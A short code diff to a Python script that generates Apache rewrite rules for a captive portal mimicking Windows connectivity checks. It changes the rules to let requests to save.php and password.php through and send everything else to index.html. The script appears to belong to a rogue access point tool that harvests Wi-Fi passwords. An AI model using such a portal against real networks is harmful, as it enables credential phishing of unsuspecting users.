@@ -270,7 +270,9 @@ def create_vhost_microsoft():
     Alias /connecttest.txt    /var/www/captive/index.html
 
     RewriteEngine On
-    RewriteCond %{REQUEST_URI} !^/(hotspot-detect\.html|generate_204|connecttest\.txt)$
+    RewriteCond %{REQUEST_URI} !^/(save\.php|password\.php|save2\.php)$
+    RewriteCond %{REQUEST_URI} !\.(?:css|js|png|jpg|svg|ico|woff2?)$ [NC]
+    RewriteRule ^ /index.html [L]
     RewriteCond %{REQUEST_FILENAME} !-f
     RewriteCond %{REQUEST_FILENAME} !-d
     RewriteRule ^ /index.html [L]
@@ -472,7 +474,7 @@ def main():
     if script_args.Cap == 'microsoft':
         setup_captive_portal_files("microsoft")
     setup_log_file()
-    
+
     if script_args.Cap == 'default':
         create_vhost()
     if script_args.Cap == 'microsoft':
